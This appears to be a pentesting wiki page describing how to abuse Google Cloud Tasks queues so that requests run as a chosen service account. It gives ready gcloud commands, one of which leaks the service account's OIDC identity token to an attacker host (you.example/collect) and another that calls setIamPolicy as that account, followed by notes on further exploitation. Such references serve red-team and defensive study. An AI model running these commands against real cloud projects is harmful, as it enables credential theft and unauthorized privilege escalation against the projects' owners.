---
title: "Cloud Tasks: enqueuing requests that run as a service account"
description: "Abusing Cloud Tasks queues to enqueue requests that call endpoints or APIs as a chosen service account."
keywords:
  - Cloud Tasks
  - queue
  - task
  - service account
  - OIDC
---

# Cloud Tasks

Cloud Tasks dispatches queued HTTP requests, and a task can attach a service account so the request carries that account's **OIDC or OAuth token**. With `cloudtasks.tasks.create` on a queue, you enqueue a request to a Google API or your own endpoint that authenticates as the attached account, reaching the same place as the Cloud Scheduler path.

## Enqueue a task that acts as a service account

```bash
gcloud tasks queues list --location us-central1

# OIDC: leak the SA identity token to your endpoint
gcloud tasks create-http-task --queue <q> --location us-central1 \
  --url https://you.example/collect \
  --oidc-service-account-email <sa>@<proj>.iam.gserviceaccount.com

# OAuth: call a Google API as the SA
gcloud tasks create-http-task --queue <q> --location us-central1 \
  --url https://cloudresourcemanager.googleapis.com/v1/projects/<proj>:setIamPolicy \
  --method POST --body-content '{...}' \
  --oauth-service-account-email <sa>@<proj>.iam.gserviceaccount.com
```

## Exploitation notes

- The OAuth variant calls Google APIs as the SA, so the queue acts on your behalf without you holding the token.
- Reading an existing queue's tasks can expose request bodies and target URLs of legitimate work.
- Like Scheduler, an attached SA plus `actAs` is the gate; the token target does the rest.

## Tools

- **gcloud** (`tasks create-http-task`).

## References

- [HackTricks Cloud: GCP Cloud Tasks](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
- [Google: Cloud Tasks authentication](https://cloud.google.com/tasks/docs/creating-http-target-tasks)
